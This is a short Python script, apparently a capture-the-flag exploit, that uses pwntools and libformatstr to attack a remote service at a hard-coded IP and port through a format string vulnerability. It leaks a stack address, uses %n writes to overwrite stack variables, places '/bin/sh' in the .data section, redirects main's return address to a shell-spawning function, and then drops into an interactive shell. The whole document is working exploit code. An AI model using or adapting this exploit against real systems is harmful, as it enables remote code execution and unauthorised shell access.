from socket import *
from pwn import *
import binascii
import struct
import time
from libformatstr import FormatStr

def p(x):
        return struct.pack("<I", x)

def leak_stack():
    r.sendline('%38$x')
    time.sleep(0.3)
    r.recvuntil('answer')
    r.recvline()
    x = r.recvline()
    x = int(x, 16)
    print("0x{:x}".format(x))
    return x

r = remote('159.203.38.169', 5685)
var_224 = -0xd8
var_14 = 0x138
n_offset = 0x140
ret_offset = 0x160

x = leak_stack()

time.sleep(0.3)
# Overwrite n with 255
r.sendline(p(x + n_offset) + '%251c%6$n')
time.sleep(0.3)

# Write 0x4 to var_224 to proceed
r.sendline(p(x + var_224) + '%6$n')
time.sleep(0.3)

# Write 0x79c to var_14
r.sendline(p(x + var_14) +'%1944c%6$n')
time.sleep(0.3)

# Next fgets reads 255 bytes
# NOTE: This will give an error 60% of the time due to some weird bug in libformatstr. Just keep running the script.
f = FormatStr()
f[0x0804a02c] = 0x0804a024
f[0x0804a024] = "/bin/sh\0"
f[x + ret_offset] = 0x08048506

# Write "/bin/sh" into .data, overwrite string pointer, overwrite return address of main with address of __libc_win_more
payload = f.payload(6)
r.sendline(payload)
time.sleep(0.3)

r.clean()
r.interactive()
